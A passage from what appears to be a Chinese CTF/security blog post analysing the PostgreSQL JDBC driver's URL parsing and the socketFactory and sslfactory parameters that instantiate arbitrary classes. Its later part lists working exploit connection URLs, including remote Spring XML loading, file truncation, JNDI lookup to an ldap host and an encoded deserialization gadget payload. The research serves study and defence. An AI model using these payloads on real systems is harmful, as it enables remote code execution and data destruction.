class="line">  <span class="keyword">if</span> (info != <span class="literal">null</span>) &#123;</span><br><span class="line">    Set&lt;String&gt; e = info.stringPropertyNames();</span><br><span class="line">    <span class="keyword">for</span> (String propName : e) &#123;</span><br><span class="line">      <span class="type">String</span> <span class="variable">propValue</span> <span class="operator">=</span> info.getProperty(propName);</span><br><span class="line">      <span class="keyword">if</span> (propValue == <span class="literal">null</span>) &#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">PSQLException</span>(</span><br><span class="line">            GT.tr(<span class="string">&quot;Properties for the driver contains a non-string value for the key &quot;</span>)</span><br><span class="line">                + propName,</span><br><span class="line">            PSQLState.UNEXPECTED_ERROR);</span><br><span class="line">      &#125;</span><br><span class="line">      props.setProperty(propName, propValue);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="comment">// parse URL and add more properties</span></span><br><span class="line">  <span class="keyword">if</span> ((props = parseURL(url, props)) == <span class="literal">null</span>) &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">try</span> &#123;</span><br><span class="line">    <span class="comment">// Setup java.util.logging.Logger using connection properties.</span></span><br><span class="line">    setupLoggerFromProperties(props);</span><br><span class="line"></span><br><span class="line">    LOGGER.log(Level.FINE, <span class="string">&quot;Connecting with URL: &#123;0&#125;&quot;</span>, url);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Enforce login timeout, if specified, by running the connection</span></span><br><span class="line">    <span class="comment">// attempt in a separate thread. If we hit the timeout without the</span></span><br><span class="line">    <span class="comment">// connection completing, we abandon the connection attempt in</span></span><br><span class="line">    <span class="comment">// the calling thread, but the separate thread will keep trying.</span></span><br><span class="line">    <span class="comment">// Eventually, the separate thread will either fail or complete</span></span><br><span class="line">    <span class="comment">// the connection; at that point we clean up the connection if</span></span><br><span class="line">    <span class="comment">// we managed to establish one after all. See ConnectThread for</span></span><br><span class="line">    <span class="comment">// more details.</span></span><br><span class="line">    <span class="type">long</span> <span class="variable">timeout</span> <span class="operator">=</span> timeout(props);</span><br><span class="line">    <span class="keyword">if</span> (timeout &lt;= <span class="number">0</span>) &#123;</span><br><span class="line">      <span class="keyword">return</span> makeConnection(url, props);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="type">ConnectThread</span> <span class="variable">ct</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ConnectThread</span>(url, props);</span><br><span class="line">    <span class="type">Thread</span> <span class="variable">thread</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Thread</span>(ct, <span class="string">&quot;PostgreSQL JDBC driver connection thread&quot;</span>);</span><br><span class="line">    thread.setDaemon(<span class="literal">true</span>); <span class="comment">// Don&#x27;t prevent the VM from shutting down</span></span><br><span class="line">    thread.start();</span><br><span class="line">    <span class="keyword">return</span> ct.getResult(timeout);</span><br><span class="line">  &#125; <span class="keyword">catch</span> (PSQLException ex1) &#123;</span><br><span class="line">    LOGGER.log(Level.FINE, <span class="string">&quot;Connection error: &quot;</span>, ex1);</span><br><span class="line">    <span class="comment">// re-throw the exception, otherwise it will be caught next, and a</span></span><br><span class="line">    <span class="comment">// org.postgresql.unusual error will be returned instead.</span></span><br><span class="line">    <span class="keyword">throw</span> ex1;</span><br><span class="line">  &#125; <span class="keyword">catch</span> (java.security.AccessControlException ace) &#123;</span><br><span class="line">    <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">PSQLException</span>(</span><br><span class="line">        GT.tr(</span><br><span class="line">            <span class="string">&quot;Your security policy has prevented the connection from being attempted.  You probably need to grant the connect java.net.SocketPermission to the database server host and port that you wish to connect to.&quot;</span>),</span><br><span class="line">        PSQLState.UNEXPECTED_ERROR, ace);</span><br><span class="line">  &#125; <span class="keyword">catch</span> (Exception ex2) &#123;</span><br><span class="line">    LOGGER.log(Level.FINE, <span class="string">&quot;Unexpected connection error: &quot;</span>, ex2);</span><br><span class="line">    <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">PSQLException</span>(</span><br><span class="line">        GT.tr(</span><br><span class="line">            <span class="string">&quot;Something unusual has occurred to cause the driver to fail. Please report this exception.&quot;</span>),</span><br><span class="line">        PSQLState.UNEXPECTED_ERROR, ex2);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>检查传入的url是否是<code>jdbc://postgresql</code>开头，随后使用 <code>getDefaultProperties</code> 方法收集配置文件中的相关属性键值对，并调用parseURL解析传入的url</p>
+<p>跟进parseURL看看</p>
+<p><img src="/../image/achieve/202411/java--ctfshow/image-20260227114244445.png" alt="image-20260227114244445"></p>
+<p>先是通过<code>?</code>来将url分为urlServer服务器地址和urlArgs参数两部分</p>
+<p><img src="/../image/achieve/202411/java--ctfshow/image-20260227114420562.png" alt="image-20260227114420562"></p>
+<p>判断是否是<code>//</code>开头，是的话就截取<code>//</code>后面的内容。接下来查找是否有<code>/</code>，并将<code>/</code>后面的内容作为连接数据库名。因为常规的JDBC URL的格式是<code>host:port/dbname</code></p>
+<p>对<code>/</code>前面的内容按逗号分隔，可以适用于多个主机操作，并对各个主机逐个解析host和port</p>
+<p>所以例如<code>jdbc:postgresql:*//aaa.com,127.0.0.1:2234,/?socketFactory=*</code>这样的写法也是可以的，甚至可以在利用的时候进行<code>jdbc:postgresql:*//,,,  ,,,, ,, , ,,/?socketFactory=*</code>或者<code>jdbc:postgresql:*///?socketFactory=*</code>变形利用</p>
+<p><img src="/../image/achieve/202411/java--ctfshow/image-20260227115021295.png" alt="image-20260227115021295"></p>
+<p>当然，如果啥都没有的话，默认是<code>localhost:5432</code></p>
+<p><img src="/../image/achieve/202411/java--ctfshow/image-20260227114752714.png" alt="image-20260227114752714"></p>
+<p>最终把多主机、多端口以逗号拼接存入属性，供后续建立连接时使用。</p>
+<p><img src="/../image/achieve/202411/java--ctfshow/image-20260227115135258.png" alt="image-20260227115135258"></p>
+<p>接下来是参数（ Args）的解析，则是使用 <code>&amp;</code> 符切割，以 <code>=</code> 来切割键值对，并将值 URLdecode 之后存放在整体 Properties 对象中。最后返回urlProps对象</p>
+<p>然后就是连接数据库的操作了，跟进到makeConnection方法中</p>
+<p><img src="/../image/achieve/202411/java--ctfshow/image-20260227115437326.png" alt="image-20260227115437326"></p>
+<p>通过实例化一个PgConnection对象来进行连接</p>
+<p><img src="/../image/achieve/202411/java--ctfshow/image-20260227115545803.png" alt="image-20260227115545803"></p>
+<p>前面是一些初始化赋值操作，真正的连接是在org.postgresql.core.ConnectionFactory#openConnection方法中</p>
+<p><img src="/../image/achieve/202411/java--ctfshow/image-20260227115705481.png" alt="image-20260227115705481"></p>
+<p>进行了一个协议版本的判断，目前只支持了 3 版本，实例化了一个工厂类，随后调用 <code>org.postgresql.core.v3.ConnectionFactoryImpl.openConnectionImpl</code> 方法建立连接</p>
+<p><img src="/../image/achieve/202411/java--ctfshow/image-20260227115836799.png" alt="image-20260227115836799"></p>
+<h2 id="漏洞利用点"><a href="#漏洞利用点" class="headerlink" title="漏洞利用点"></a>漏洞利用点</h2><h3 id="socketFactory-socketFactoryArg"><a href="#socketFactory-socketFactoryArg" class="headerlink" title="socketFactory &amp; socketFactoryArg"></a>socketFactory &amp; socketFactoryArg</h3><p>调用了 <code>org.postgresql.core.SocketFactoryFactory.getSocketFactory</code> 方法，用来获取进行链接的 Socket 工厂类。此方法就是漏洞利用点的第一个方式了</p>
+<p><img src="/../image/achieve/202411/java--ctfshow/image-20260227115921945.png" alt="image-20260227115921945"></p>
+<p>可以看到分别从info中获取socketFactory和socketFactoryArg属性值，并调用<code>ObjectFactory.instantiate</code> 方法进行实例化，其中socketFactoryClassName就是我们之前讲过的类名ClassName，socketFactoryArg就是传入的参数值stringarg</p>
+<p>所以此处的漏洞利用方式为</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">jdbc:postgresql:<span class="comment">///?socketFactory=恶意类名&amp;socketFactoryArg=单String恶意类参数</span></span><br><span class="line">或</span><br><span class="line">jdbc:postgresql:<span class="comment">///?socketFactory=恶意类名&amp;恶意属性名=恶意属性值</span></span><br></pre></td></tr></table></figure>
+
+<h3 id="sslfactory-sslfactoryarg"><a href="#sslfactory-sslfactoryarg" class="headerlink" title="sslfactory &amp; sslfactoryarg"></a>sslfactory &amp; sslfactoryarg</h3><p>在getSocketFactory中可以看到，如果没有指定socketFactory 的话就会返回默认的socketFactory工厂类，回到上一步，会对所有获取到的host进行尝试连接，会调用到tryConnect</p>
+<p><img src="/../image/achieve/202411/java--ctfshow/image-20260227124525770.png" alt="image-20260227124525770"></p>
+<p>该方法会创建连接，并判断连接的目标是否支持SSL</p>
+<p><img src="/../image/achieve/202411/java--ctfshow/image-20260227124727627.png" alt="image-20260227124727627"></p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> PGStream <span class="title function_">enableSSL</span><span class="params">(PGStream pgStream, SslMode sslMode, Properties info,</span></span><br><span class="line"><span class="params">    <span class="type">int</span> connectTimeout)</span></span><br><span class="line">    <span class="keyword">throws</span> IOException, PSQLException &#123;</span><br><span class="line">  <span class="keyword">if</span> (sslMode == SslMode.DISABLE) &#123;</span><br><span class="line">    <span class="keyword">return</span> pgStream;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> (sslMode == SslMode.ALLOW) &#123;</span><br><span class="line">    <span class="comment">// Allow ==&gt; start with plaintext, use encryption if required by server</span></span><br><span class="line">    <span class="keyword">return</span> pgStream;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  LOGGER.log(Level.FINEST, <span class="string">&quot; FE=&gt; SSLRequest&quot;</span>);</span><br><span class="line"></span><br><span class="line">  <span class="comment">// Send SSL request packet</span></span><br><span class="line">  pgStream.sendInteger4(<span class="number">8</span>);</span><br><span class="line">  pgStream.sendInteger2(<span class="number">1234</span>);</span><br><span class="line">  pgStream.sendInteger2(<span class="number">5679</span>);</span><br><span class="line">  pgStream.flush();</span><br><span class="line"></span><br><span class="line">  <span class="comment">// Now get the response from the backend, one of N, E, S.</span></span><br><span class="line">  <span class="type">int</span> <span class="variable">beresp</span> <span class="operator">=</span> pgStream.receiveChar();</span><br><span class="line">  <span class="keyword">switch</span> (beresp) &#123;</span><br><span class="line">    <span class="keyword">case</span> <span class="string">&#x27;E&#x27;</span>:</span><br><span class="line">      LOGGER.log(Level.FINEST, <span class="string">&quot; &lt;=BE SSLError&quot;</span>);</span><br><span class="line"></span><br><span class="line">      <span class="comment">// Server doesn&#x27;t even know about the SSL handshake protocol</span></span><br><span class="line">      <span class="keyword">if</span> (sslMode.requireEncryption()) &#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">PSQLException</span>(GT.tr(<span class="string">&quot;The server does not support SSL.&quot;</span>),</span><br><span class="line">            PSQLState.CONNECTION_REJECTED);</span><br><span class="line">      &#125;</span><br><span class="line"></span><br><span class="line">      <span class="comment">// We have to reconnect to continue.</span></span><br><span class="line">      <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">PGStream</span>(pgStream, connectTimeout);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">case</span> <span class="string">&#x27;N&#x27;</span>:</span><br><span class="line">      LOGGER.log(Level.FINEST, <span class="string">&quot; &lt;=BE SSLRefused&quot;</span>);</span><br><span class="line"></span><br><span class="line">      <span class="comment">// Server does not support ssl</span></span><br><span class="line">      <span class="keyword">if</span> (sslMode.requireEncryption()) &#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">PSQLException</span>(GT.tr(<span class="string">&quot;The server does not support SSL.&quot;</span>),</span><br><span class="line">            PSQLState.CONNECTION_REJECTED);</span><br><span class="line">      &#125;</span><br><span class="line"></span><br><span class="line">      <span class="keyword">return</span> pgStream;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">case</span> <span class="string">&#x27;S&#x27;</span>:</span><br><span class="line">      LOGGER.log(Level.FINEST, <span class="string">&quot; &lt;=BE SSLOk&quot;</span>);</span><br><span class="line"></span><br><span class="line">      <span class="comment">// Server supports ssl</span></span><br><span class="line">      org.postgresql.ssl.MakeSSL.convert(pgStream, info);</span><br><span class="line">      <span class="keyword">return</span> pgStream;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">default</span>:</span><br><span class="line">      <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">PSQLException</span>(GT.tr(<span class="string">&quot;An error occurred while setting up the SSL connection.&quot;</span>),</span><br><span class="line">          PSQLState.PROTOCOL_VIOLATION);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>与目标服务器进行 SSL 协议数据交互，并判断服务器返回值为字符 <code>S</code> 也就是 byte 83，则代表服务器支持 SSL。进入convert方法</p>
+<p><img src="/../image/achieve/202411/java--ctfshow/image-20260227124944109.png" alt="image-20260227124944109"></p>
+<p>很熟悉的代码，跟进看看</p>
+<p><img src="/../image/achieve/202411/java--ctfshow/image-20260227124959105.png" alt="image-20260227124959105"></p>
+<p>哎，和之前分析的很像，只不过这里的参数变成了sslfactory和sslfactoryarg，也一样会调用ObjectFactory.instantiate进行实例化操作</p>
+<p>所以此处的触发方式为：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">jdbc:postgresql:<span class="comment">///?sslfactory=恶意类名&amp;sslfactoryarg=单String恶意类参数</span></span><br><span class="line">或</span><br><span class="line">jdbc:postgresql:<span class="comment">///?sslfactory=恶意类名&amp;恶意属性名=恶意属性值</span></span><br></pre></td></tr></table></figure>
+
+<p>但这种方式就有了前置条件：能联通一个真的支持 SSL 的 Postgresql 数据库，或连接一个能返回 <code>S</code> 的监听端口（或恶意服务器）。</p>
+<p>如果要搭建支持 SSL 的 postgre 数据库，可以参考</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">mkdir postgre</span><br><span class="line">cd postgre</span><br><span class="line">openssl req -<span class="keyword">new</span> -text -passout pass:abcd -subj /CN=localhost -out server.req</span><br><span class="line">openssl rsa -in privkey.pem -passin pass:abcd -out server.key</span><br><span class="line">openssl req -x509 -in server.req -text -key server.key -out server.crt</span><br><span class="line">docker run -d --name postgressl -v <span class="string">&quot;$PWD/server.crt:/var/lib/postgresql/server.crt:ro&quot;</span> -v <span class="string">&quot;$PWD/server.key:/var/lib/postgresql/server.key:ro&quot;</span>  postgres:<span class="number">11</span>-alpine -c ssl=on -c ssl_cert_file=/<span class="keyword">var</span>/lib/postgresql/server.crt -c ssl_key_file=/<span class="keyword">var</span>/lib/postgresql/server.key</span><br></pre></td></tr></table></figure>
+
+<p>然后我们看看上面提到的执行类Sink class能造成什么样的结果</p>
+<h2 id="Sink-Class"><a href="#Sink-Class" class="headerlink" title="Sink Class"></a>Sink Class</h2><p>看到org.springframework.context.support.ClassPathXmlApplicationContext#ClassPathXmlApplicationContext(java.lang.String)构造方法</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="title function_">ClassPathXmlApplicationContext</span><span class="params">(String configLocation)</span> <span class="keyword">throws</span> BeansException &#123;</span><br><span class="line">	<span class="built_in">this</span>(<span class="keyword">new</span> <span class="title class_">String</span>[] &#123;configLocation&#125;, <span class="literal">true</span>, <span class="literal">null</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>继续跟进</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="title function_">ClassPathXmlApplicationContext</span><span class="params">(String[] configLocations, <span class="type">boolean</span> refresh, ApplicationContext parent)</span></span><br><span class="line">		<span class="keyword">throws</span> BeansException &#123;</span><br><span class="line"></span><br><span class="line">	<span class="built_in">super</span>(parent);</span><br><span class="line">	setConfigLocations(configLocations);</span><br><span class="line">	<span class="keyword">if</span> (refresh) &#123;</span><br><span class="line">		refresh();</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>这里会调用其父类<code>AbstractXmlApplicationContext#refresh</code>方法以给定的恶意XML文件中加载定义</p>
+<p><img src="/../image/achieve/202411/java--ctfshow/image-20260227121051810.png" alt="image-20260227121051810"></p>
+<p>这里就会对xml文件的内容进行一个解析执行了</p>
+<h1 id="利用方式"><a href="#利用方式" class="headerlink" title="利用方式"></a>利用方式</h1><h2 id="ClassPathXmlApplicationContext-FileSystemXmlApplicationContext"><a href="#ClassPathXmlApplicationContext-FileSystemXmlApplicationContext" class="headerlink" title="ClassPathXmlApplicationContext&amp;FileSystemXmlApplicationContext"></a>ClassPathXmlApplicationContext&amp;FileSystemXmlApplicationContext</h2><p>上面也讲过了，ClassPathXmlApplicationContext&#x2F;FileSystemXmlApplicationContext 通过远程执行 xml 来 RCE，但利用条件也显而易见</p>
+<ul>
+<li>需要额外导入spring-context-support依赖（或者其他自行封装包例如 weblogic 的 <code>com.bea.core.repackaged.springframework.context.support.FileSystemXmlApplicationContext</code> 等）</li>
+<li>另一个是需要机器出网</li>
+</ul>
+<p>在poc.xml 所在目录下启动http服务并运行我们的代码</p>
+<p><img src="/../image/achieve/202411/java--ctfshow/image-20260227125811748.png" alt="image-20260227125811748"></p>
+<p>接下来分享师傅文章中其他可以用到的sink点</p>
+<p><strong>[2] FileOutputStream&#x2F;InputStream</strong></p>
+<p>FileOutputStream 清空文件，实战中可以配合业务逻辑清空特定文件，达到 RCE 的目的。</p>
+<figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">jdbc:</span><span class="symbol">postgresql:</span>/<span class="regexp">//</span><span class="string">?s</span>ocketFactory=java.io.<span class="title class_">FileOutputStream</span>&amp;socketFactoryArg=<span class="regexp">/var/www</span><span class="regexp">/app/install</span>.lck</span><br></pre></td></tr></table></figure>
+
+<p>反过来 FileInputStream 可以探测文件是否存在，不过需要看到报错信息来判断。</p>
+<p><strong>[3] JLabel</strong></p>
+<p>CS RCE 的套娃，需要依赖 batik-swing（对 JDK 环境及版本也有要求）。</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">jdbc:postgresql:///?socketFactory=javax.swing.JLabel&amp;socketFactoryArg=<span class="tag">&lt;<span class="name">html</span>&gt;</span><span class="tag">&lt;<span class="name">object</span> <span class="attr">classid</span>=<span class="string">&quot;org.apache.batik.swing.JSVGCanvas&quot;</span>&gt;</span><span class="tag">&lt;<span class="name">param</span> <span class="attr">name</span>=<span class="string">&quot;URI&quot;</span> <span class="attr">value</span>=<span class="string">&quot;http://localhost:8080/1.xml&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">object</span>&gt;</span><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p><strong>[4] MiniAdmin</strong></p>
+<p>Mysql 的套娃。需要依赖 mysql-connector-java（这个类高版本才有）。</p>
+<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">jdbc:postgresql:<span class="regexp">//</span><span class="regexp">/?socketFactory=com.mysql.cj.jdbc.admin.MiniAdmin&amp;socketFactoryArg=jdbc:mysql:/</span><span class="regexp">/127.0.0.1:3306/</span>test?...</span><br></pre></td></tr></table></figure>
+
+<p><strong>[5] IniEnvironment</strong></p>
+<p>在 ActiveMQ 不出网利用中出现的类，可以配合 BCEL 加载以及反序列化，需要依赖 activemq-shiro 以及对应依赖。</p>
+<p>根据 Anchor 师傅在先知上发现的文章。有两条不出网的利用链，第一条是 BasicDataSource 配合 BCEL 类加载，需要的依赖和限制有点多，这里就不列举了。</p>
+<p>第二条是 <code>ActiveMQObjectMessage#getObject</code> 触发的反序列化</p>
+<figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">jdbc:</span>postgresql:///?socketFactory<span class="operator">=</span>org.apache.activemq.shiro.env.IniEnvironment&amp;socketFactoryArg<span class="operator">=</span><span class="variable">%5</span>Bmain<span class="variable">%5</span>D<span class="variable">%0</span>Abs<span class="variable">%20</span><span class="variable">%3</span>D<span class="variable">%20</span>org.apache.activemq.util.ByteSequence<span class="variable">%0</span>Amessage<span class="variable">%20</span><span class="variable">%3</span>D<span class="variable">%20</span>org.apache.activemq.command.ActiveMQObjectMessage<span class="variable">%0</span>Abs.data<span class="variable">%20</span><span class="variable">%3</span>D<span class="variable">%20</span>rO<span class="number">0</span>ABXNyABdqYXZhLnV<span class="number">0</span>aWwuUHJpb<span class="number">3</span>JpdHlRdWV<span class="number">1</span>ZZTaMLT<span class="number">7</span>P<span class="number">4</span>KxAwACSQAEc<span class="number">2</span>l<span class="number">6</span>ZUwACmNvbXBhcmF<span class="number">0</span>b<span class="number">3</span>J<span class="number">0</span>ABZMamF<span class="number">2</span>YS<span class="number">91</span>dGlsL<span class="number">0</span>NvbXBhcmF<span class="number">0</span>b<span class="number">3</span>I<span class="number">7</span>eHAAAAACc<span class="number">3</span>IAK<span class="number">29</span>yZy<span class="number">5</span>hcGFjaGUuY<span class="number">29</span>tbW<span class="number">9</span>ucy<span class="number">5</span>iZWFudXRpbHMuQmVhbkNvbXBhcmF<span class="number">0</span>b<span class="number">3</span>LjoYjqcyKkSAIAAkwACmNvbXBhcmF<span class="number">0</span>b<span class="number">3</span>JxAH<span class="number">4</span>AAUwACHByb<span class="number">3</span>BlcnR<span class="number">5</span>dAASTGphdmEvbGFuZy<span class="number">9</span>TdHJpbmc<span class="number">7</span>eHBzcgA<span class="variable">%2</span>Fb<span class="number">3</span>JnLmFwYWNoZS<span class="number">5</span>jb<span class="number">21</span>tb<span class="number">25</span>zLmNvbGxlY<span class="number">3</span>Rpb<span class="number">25</span>zLmNvbXBhcmF<span class="number">0</span>b<span class="number">3</span>JzLkNvbXBhcmFibGVDb<span class="number">21</span>wYXJhdG<span class="number">9</span>y<span class="variable">%2</span>B<span class="variable">%2</span>FSZJbhusTcCAAB<span class="number">4</span>cHQAEG<span class="number">91</span>dHB<span class="number">1</span>dFByb<span class="number">3</span>BlcnRpZXN<span class="number">3</span>BAAAAANzcgA<span class="number">6</span>Y<span class="number">29</span>tLnN<span class="number">1</span>bi<span class="number">5</span>vcmcuYXBhY<span class="number">2</span>hlLnhhbGFuLmludGVybmFsLnhzbHRjLnRyYXguVGVtcGxhdGVzSW<span class="number">1</span>wbAlXT<span class="number">8</span>FurKszAwAGSQANX<span class="number">2</span>luZGVudE<span class="number">51</span>bWJlckkADl<span class="number">90</span>cmFuc<span class="number">2</span>xldEluZGV<span class="number">4</span>WwAKX<span class="number">2</span>J<span class="number">5</span>dGVjb<span class="number">2</span>Rlc<span class="number">3</span>QAA<span class="number">1</span>tbQlsABl<span class="number">9</span>jbGFzc<span class="number">3</span>QAEltMamF<span class="number">2</span>YS<span class="number">9</span>sYW<span class="number">5</span>nL<span class="number">0</span>NsYXNzO<span class="number">0</span>wABV<span class="number">9</span>uYW<span class="number">1</span>lcQB<span class="variable">%2</span>BAARMABFfb<span class="number">3</span>V<span class="number">0</span>cHV<span class="number">0</span>UHJvcGVydGllc<span class="number">3</span>QAFkxqYXZhL<span class="number">3</span>V<span class="number">0</span>aWwvUHJvcGVydGllczt<span class="number">4</span>cAAAAAAAAAAAdXIAA<span class="number">1</span>tbQkv<span class="number">9</span>GRVnZ<span class="number">9</span>s<span class="number">3</span>AgAAeHAAAAACdXIAAltCrPMX<span class="variable">%2</span>BAYIVOACAAB<span class="number">4</span>cAAAAU<span class="number">3</span>K<span class="variable">%2</span>Frq<span class="variable">%2</span>BAAAAMQAWAQA<span class="number">0</span>b<span class="number">3</span>JnL<span class="number">2</span>FwYWNoZS<span class="number">93</span>aWNrZXQvYmF<span class="number">0</span>aWsvYnJpZGdlL<span class="number">1</span>NWR<span class="number">0</span>Jyb<span class="number">2</span>tlbkxpbmtQcm<span class="number">92</span>aWRlcgcAAQEAEGphdmEvbGFuZy<span class="number">9</span>PYmplY<span class="number">3</span>QHAAMBAAY<span class="number">8</span>aW<span class="number">5</span>pdD<span class="number">4</span>BAAMoKVYBAARDb<span class="number">2</span>RlDAAFAAYKAAQACAEAEWphdmEvbGFuZy<span class="number">9</span>SdW<span class="number">50</span>aW<span class="number">1</span>lBwAKAQAKZ<span class="number">2</span>V<span class="number">0</span>UnVudGltZQEAFSgpTGphdmEvbGFuZy<span class="number">9</span>SdW<span class="number">50</span>aW<span class="number">1</span>lOwwADAANCgALAA<span class="number">4</span>BABZvcGVuIC<span class="number">1</span>hIENhbGN<span class="number">1</span>bGF<span class="number">0</span>b<span class="number">3</span>IuYXBwCAAQAQAEZXhlYwEAJyhMamF<span class="number">2</span>YS<span class="number">9</span>sYW<span class="number">5</span>nL<span class="number">1</span>N<span class="number">0</span>cmluZzspTGphdmEvbGFuZy<span class="number">9</span>Qcm<span class="number">9</span>jZXNzOwwAEgATCgALABQAIQACAAQAAAAAAAEAAQAFAAYAAQAHAAAAGgACAAEAAAAOKrcACbgADxIRtgAVV<span class="number">7</span>EAAAAAAAB<span class="number">1</span>cQB<span class="variable">%2</span>BABAAAAEayv<span class="number">66</span>vgAAADQAEQEANW<span class="number">9</span>yZy<span class="number">9</span>hcGFjaGUvY<span class="number">29</span>tbW<span class="number">9</span>ucy<span class="number">9</span>qYW<span class="number">0</span>vcHJvdmlkZXIvSmFtU<span class="number">2</span>VydmljZUZhY<span class="number">3</span>RvcnlJbXBsBwABAQAQamF<span class="number">2</span>YS<span class="number">9</span>sYW<span class="number">5</span>nL<span class="number">09</span>iamVjdAcAAwEAClNvdXJjZUZpbGUBABpKYW<span class="number">1</span>TZXJ<span class="number">2</span>aWNlRmFjdG<span class="number">9</span>yeUltcGwuamF<span class="number">2</span>YQEAEHNlcmlhbFZlcnNpb<span class="number">25</span>VSUQBAAFKBXHmae<span class="number">48</span>bUcYAQANQ<span class="number">29</span>uc<span class="number">3</span>RhbnRWYWx<span class="number">1</span>ZQEABjxpbml<span class="number">0</span>PgEAAygpVgwADAANCgAEAA<span class="number">4</span>BAARDb<span class="number">2</span>RlACEAAgAEAAAAAQAaAAcACAABAAsAAAACAAkAAQABAAwADQABABAAAAARAAEAAQAAAAUqtwAPsQAAAAAAAQAFAAAAAgAGcHQAAWFwdwEAeHEAfgANeA<span class="variable">%3</span>D<span class="variable">%3</span>D<span class="variable">%0</span>Abs.length<span class="variable">%20</span><span class="variable">%3</span>D<span class="variable">%201628</span><span class="variable">%0</span>Abs.offset<span class="variable">%20</span><span class="variable">%3</span>D<span class="variable">%200</span><span class="variable">%0</span>Amessage.content<span class="variable">%20</span><span class="variable">%3</span>D<span class="variable">%20</span><span class="variable">%24</span>bs<span class="variable">%0</span>Amessage.trustAllPackages<span class="variable">%20</span><span class="variable">%3</span>D<span class="variable">%20</span><span class="keyword">true</span><span class="variable">%0</span>Amessage.object.<span class="keyword">x</span><span class="variable">%20</span><span class="variable">%3</span>D<span class="variable">%20</span><span class="keyword">x</span></span><br></pre></td></tr></table></figure>
+
+<p><strong>[6] HikariConfig</strong></p>
+<p>柯字辈师傅分享，利用 Properties 方式，走 HikariConfig 触发 JNDI，需要依赖 HikariCP。</p>
+<figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">jdbc:postgresql:<span class="regexp">//</span><span class="regexp">/?socketFactory=com.zaxxer.hikari.HikariConfi&amp;metricRegistry=ldap:/</span><span class="regexp">/127.0.0.1:1389/</span><span class="keyword">exp</span></span><br></pre></td></tr></table></figure>
+
